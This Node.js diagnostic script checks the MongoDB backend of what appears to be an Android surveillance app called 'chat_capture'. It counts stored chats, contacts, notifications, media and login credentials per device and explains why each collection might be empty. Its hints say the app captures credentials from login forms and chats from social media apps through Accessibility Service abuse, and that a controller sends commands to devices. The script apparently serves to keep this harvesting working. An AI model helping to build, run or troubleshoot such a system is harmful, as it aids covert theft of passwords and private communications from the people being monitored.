#!/usr/bin/env node

/**
 * Script to check MongoDB collection counts and identify empty collections
 * Usage: node check-collections.js [MONGODB_URI] [DB_NAME]
 * Example: node check-collections.js mongodb://localhost:27017 chat_capture
 */

const { MongoClient } = require('mongodb');

const MONGODB_URI = process.argv[2] || process.env.MONGODB_URI || 'mongodb://localhost:27017';
const DB_NAME = process.argv[3] || process.env.MONGODB_DB_NAME || 'chat_capture';

const collections = [
    'chats',
    'commands',
    'contacts',
    'credentials',
    'device_ownership',
    'devices',
    'logs',
    'media_files',
    'notifications',
    'users'
];

async function checkCollections() {
    let client;
    try {
        console.log('🔌 Connecting to MongoDB...');
        console.log(`   URI: ${MONGODB_URI}`);
        console.log(`   Database: ${DB_NAME}\n`);
        
        client = new MongoClient(MONGODB_URI);
        await client.connect();
        console.log('✅ Connected to MongoDB\n');

        const db = client.db(DB_NAME);

        console.log('📊 Collection Status:\n');
        console.log('Collection Name'.padEnd(25) + 'Count'.padEnd(10) + 'Status');
        console.log('-'.repeat(50));

        const results = [];

        for (const collectionName of collections) {
            try {
                const count = await db.collection(collectionName).countDocuments();
                const status = count === 0 ? '❌ EMPTY' : `✅ ${count} documents`;
                results.push({ name: collectionName, count, status });
                console.log(collectionName.padEnd(25) + count.toString().padEnd(10) + status);
            } catch (error) {
                console.log(collectionName.padEnd(25) + 'ERROR'.padEnd(10) + '❌ ' + error.message);
                results.push({ name: collectionName, count: -1, status: 'ERROR' });
            }
        }

        console.log('\n' + '='.repeat(50));
        console.log('\n📋 Empty Collections Analysis:\n');

        const emptyCollections = results.filter(r => r.count === 0);
        const populatedCollections = results.filter(r => r.count > 0);

        if (emptyCollections.length > 0) {
            console.log('❌ Empty Collections:');
            emptyCollections.forEach(col => {
                console.log(`   - ${col.name}`);
            });
            console.log('');
        }

        if (populatedCollections.length > 0) {
            console.log('✅ Populated Collections:');
            populatedCollections.forEach(col => {
                console.log(`   - ${col.name}: ${col.count} documents`);
            });
            console.log('');
        }

        // Provide reasons why collections might be empty
        console.log('🔍 Why Collections Might Be Empty:\n');

        const reasons = {
            'chats': 'App needs Accessibility Service enabled + Capture Enabled toggle ON. Chats are captured from social media apps.',
            'contacts': 'App needs READ_CONTACTS permission + Capture Enabled toggle ON. Contacts are synced from device.',
            'credentials': 'App needs Accessibility Service enabled + Capture Enabled toggle ON. Credentials captured from login forms.',
            'media_files': 'Media files are uploaded when notifications contain media OR when files are downloaded (<20MB).',
            'notifications': 'App needs Notification Access permission + Capture Enabled toggle ON. Notifications captured from all apps.',
            'commands': 'Commands are created when controller app or server sends commands to devices.',
            'devices': 'Devices are registered when app first connects to server.',
            'device_ownership': 'Created when a device is assigned to a user (device owner role).',
            'logs': 'Request logs are created by requestLogger middleware for all API requests.',
            'users': 'Created on server startup (admin user) or when new users register.'
        };

        emptyCollections.forEach(col => {
            if (reasons[col.name]) {
                console.log(`   ${col.name}:`);
                console.log(`      ${reasons[col.name]}\n`);
            }
        });

        // Check for common issues
        console.log('🔧 Common Issues to Check:\n');

        // Check if any devices are registered
        const deviceCount = await db.collection('devices').countDocuments();
        if (deviceCount === 0) {
            console.log('   ⚠️  No devices registered - App may not be installed or not connecting to server');
            console.log('      Fix: Install app and verify server URL in app settings\n');
        } else {
            console.log(`   ✅ ${deviceCount} device(s) registered\n`);
            
            // Get device details
            const devices = await db.collection('devices').find({}).limit(5).toArray();
            devices.forEach(device => {
                console.log(`      - ${device.deviceId} (Last seen: ${device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'})`);
            });
            console.log('');
        }

        // Check recent activity
        const recentNotifications = await db.collection('notifications').countDocuments({
            timestamp: { $gte: Date.now() - 24 * 60 * 60 * 1000 }
        });
        if (recentNotifications === 0 && deviceCount > 0) {
            console.log('   ⚠️  No notifications in last 24 hours - Check app permissions and Capture Enabled toggle');
            console.log('      Fix: Grant Notification Access and enable Capture in app settings\n');
        } else if (recentNotifications > 0) {
            console.log(`   ✅ ${recentNotifications} notifications in last 24 hours\n`);
        }

        const recentLogs = await db.collection('logs').countDocuments({
            createdAt: { $gte: Math.floor(Date.now() / 1000) - 3600 }
        });
        if (recentLogs === 0) {
            console.log('   ⚠️  No API requests in last hour - Server may not be receiving requests');
            console.log('      Fix: Check server is running and app is connecting\n');
        } else {
            console.log(`   ✅ ${recentLogs} API requests in last hour\n`);
        }

        // Check for unsynced data patterns
        if (deviceCount > 0) {
            console.log('📱 Device Data Sync Status:\n');
            
            const deviceIds = await db.collection('devices').find({}).project({ deviceId: 1 }).toArray();
            
            for (const device of deviceIds.slice(0, 3)) {
                const deviceId = device.deviceId;
                const notificationCount = await db.collection('notifications').countDocuments({ deviceId });
                const chatCount = await db.collection('chats').countDocuments({ deviceId });
                const contactCount = await db.collection('contacts').countDocuments({ deviceId });
                const credentialCount = await db.collection('credentials').countDocuments({ deviceId });
                
                console.log(`   Device: ${deviceId}`);
                console.log(`      Notifications: ${notificationCount}`);
                console.log(`      Chats: ${chatCount}`);
                console.log(`      Contacts: ${contactCount}`);
                console.log(`      Credentials: ${credentialCount}`);
                console.log('');
            }
        }

        console.log('='.repeat(50));
        console.log('\n💡 Next Steps:');
        console.log('   1. Check app installation: adb shell pm list packages | grep com.chats.capture');
        console.log('   2. Check permissions: See PERMISSION_GRANT_STEPS.md');
        console.log('   3. Check logcat: adb logcat -s NOTIFICATION_CAPTURE:D CHAT_CAPTURE:D');
        console.log('   4. Verify server URL in app settings');
        console.log('   5. Enable Capture toggle in app settings\n');

    } catch (error) {
        console.error('❌ Error:', error.message);
        if (error.message.includes('ECONNREFUSED')) {
            console.error('\n💡 MongoDB connection failed. Check:');
            console.error('   1. MongoDB is running');
            console.error('   2. Connection string is correct');
            console.error('   3. Network connectivity');
            console.error('\n   Example: node check-collections.js mongodb://your-host:27017 chat_capture');
        }
        process.exit(1);
    } finally {
        if (client) {
            await client.close();
        }
    }
}

checkCollections();
